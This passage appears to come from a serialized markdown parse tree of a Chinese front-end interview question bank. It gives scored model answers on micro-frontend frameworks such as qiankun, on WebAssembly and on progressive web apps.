single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。\\n","task":false,"loose":false,"text":"**1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","tokens":[{"type":"text","raw":"**1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","text":"**1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","text":" qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。\\n","task":false,"loose":false,"text":"**1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。","tokens":[{"type":"text","raw":"**1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。","text":"**1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" micro-app：基于 Webcomponent 的微前端方案，由京东出品。","text":" micro-app：基于 Webcomponent 的微前端方案，由京东出品。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。\\n","task":false,"loose":false,"text":"**1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","tokens":[{"type":"text","raw":"**1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","text":"**1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","text":" EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","task":false,"loose":false,"text":"**1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","tokens":[{"type":"text","raw":"**1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","text":"**1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","text":" 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Qiankun 有哪些优点？\\n\\n","depth":2,"text":"Qiankun 有哪些优点？","tokens":[{"type":"text","raw":"Qiankun 有哪些优点？","text":"Qiankun 有哪些优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。\\n- **1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。\\n- **1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。\\n- **1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。\\n","task":false,"loose":false,"text":"**1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","tokens":[{"type":"text","raw":"**1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","text":"**1：** 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","text":" 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。\\n","task":false,"loose":false,"text":"**1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","tokens":[{"type":"text","raw":"**1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","text":"**1：** 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","text":" 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。\\n","task":false,"loose":false,"text":"**1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","tokens":[{"type":"text","raw":"**1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","text":"**1：** 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","text":" 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","task":false,"loose":false,"text":"**1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","tokens":[{"type":"text","raw":"**1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","text":"**1：** 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","text":" 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Qiankun 如何实现子应用的加载？\\n\\n","depth":2,"text":"Qiankun 如何实现子应用的加载？","tokens":[{"type":"text","raw":"Qiankun 如何实现子应用的加载？","text":"Qiankun 如何实现子应用的加载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","task":false,"loose":false,"text":"**2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","tokens":[{"type":"text","raw":"**2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","text":"**2：** Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","text":" Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Qiankun 如何处理子应用之间的公共依赖？\\n\\n","depth":2,"text":"Qiankun 如何处理子应用之间的公共依赖？","tokens":[{"type":"text","raw":"Qiankun 如何处理子应用之间的公共依赖？","text":"Qiankun 如何处理子应用之间的公共依赖？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","task":false,"loose":false,"text":"**1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","tokens":[{"type":"text","raw":"**1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","text":"**1：** 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","text":" 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。","escaped":false}]}]}]}]},{"key":"前端最前沿","content":"<h1>前端最前沿</h1>\\n<h2>什么是 WebAssembly？其主要用途是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：</li>\\n<li><strong>1：</strong> 高性能计算：如游戏引擎、视频和图像处理。</li>\\n<li><strong>1：</strong> 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。</li>\\n<li><strong>1：</strong> 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。</li>\\n</ul>\\n<h2>WebAssembly (Wasm) 的核心特点有哪些？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。</li>\\n<li><strong>1：</strong>  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。</li>\\n<li><strong>1：</strong>  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。</li>\\n<li><strong>1：</strong>  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。</li>\\n<li><strong>1：</strong>  小体积：Wasm 格式文件较小，传输高效，加载速度快。</li>\\n</ul>\\n<h2>WebAssembly 的工作原理是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。</li>\\n<li><strong>1：</strong> 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。</li>\\n<li><strong>1：</strong> 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。</li>\\n<li><strong>1：</strong> 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。</li>\\n</ul>\\n<h2>什么是PWA？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。</li>\\n</ul>\\n<h2>PWA有那些优点？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（9分）</h4>\\n<ul>\\n<li><strong>1：</strong> 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快</li>\\n<li><strong>1：</strong> 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。</li>\\n<li><strong>1：</strong> 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本</li>\\n<li><strong>1：</strong> 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。</li>\\n<li><strong>1：</strong> SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。</li>\\n<li><strong>1：</strong> 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。</li>\\n<li><strong>1：</strong> 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。</li>\\n<li><strong>1：</strong> 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。</li>\\n<li><strong>1：</strong> 绕过应用商店</li>\\n</ul>\\n<h2>PWA有什么缺点？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><strong>1：</strong> 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。</li>\\n<li><strong>1：</strong> 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。</li>\\n<li><strong>1：</strong> 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 前端最前沿\\n\\n","depth":1,"text":"前端最前沿","tokens":[{"type":"text","raw":"前端最前沿","text":"前端最前沿","escaped":false}]},{"type":"heading","raw":"## 什么是 WebAssembly？其主要用途是什么？\\n\\n","depth":2,"text":"什么是 WebAssembly？其主要用途是什么？","tokens":[{"type":"text","raw":"什么是 WebAssembly？其主要用途是什么？","text":"什么是 WebAssembly？其主要用途是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：\\n- **1：** 高性能计算：如游戏引擎、视频和图像处理。\\n- **1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。\\n- **1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：\\n","task":false,"loose":false,"text":"**1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","tokens":[{"type":"text","raw":"**1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","text":"**1：** WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","text":" WebAssembly（简称 Wasm）是一种能够在浏览器中运行的低级二进制格式，设计用于高效、跨平台的计算密集型应用。它由 W3C 标准化，可在主流浏览器中运行。WebAssembly 允许开发者使用多种编程语言（如 C、C++、Rust）编写代码，然后将代码编译为 WebAssembly 模块，使其在浏览器中高效运行。其主要用途包括：","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 高性能计算：如游戏引擎、视频和图像处理。\\n","task":false,"loose":false,"text":"**1：** 高性能计算：如游戏引擎、视频和图像处理。","tokens":[{"type":"text","raw":"**1：** 高性能计算：如游戏引擎、视频和图像处理。","text":"**1：** 高性能计算：如游戏引擎、视频和图像处理。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 高性能计算：如游戏引擎、视频和图像处理。","text":" 高性能计算：如游戏引擎、视频和图像处理。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。\\n","task":false,"loose":false,"text":"**1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","tokens":[{"type":"text","raw":"**1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","text":"**1：** 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","text":" 跨平台：编译成字节码后能在多种平台（桌面端、移动端、嵌入式设备）上运行。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","task":false,"loose":false,"text":"**1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","tokens":[{"type":"text","raw":"**1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","text":"**1：** 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","text":" 后端计算转移：如数据加密、解压缩等密集型运算从服务器转移到客户端。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## WebAssembly (Wasm) 的核心特点有哪些？\\n\\n","depth":2,"text":"WebAssembly (Wasm) 的核心特点有哪些？","tokens":[{"type":"text","raw":"WebAssembly (Wasm) 的核心特点有哪些？","text":"WebAssembly (Wasm) 的核心特点有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。\\n- **1：**  跨平台支持：WebAssembly 是浏览器标准，适用于 Chrome、Firefox、Safari 等主流浏览器，且具备良好的跨平台兼容性。\\n- **1：**  安全性：Wasm 运行在沙盒环境，不能直接访问宿主机器资源，符合 Web 的安全模型。\\n- **1：**  语言多样性：支持 C、C++、Rust 等多种语言，弥补了 JavaScript 仅限于单语言开发的不足。\\n- **1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。\\n","task":false,"loose":false,"text":"**1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","tokens":[{"type":"text","raw":"**1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","text":"**1：**  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","text":"  高性能：WebAssembly 的字节码格式在浏览器中编译运行接近原生速度，非常适合对性能要求高的任务。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  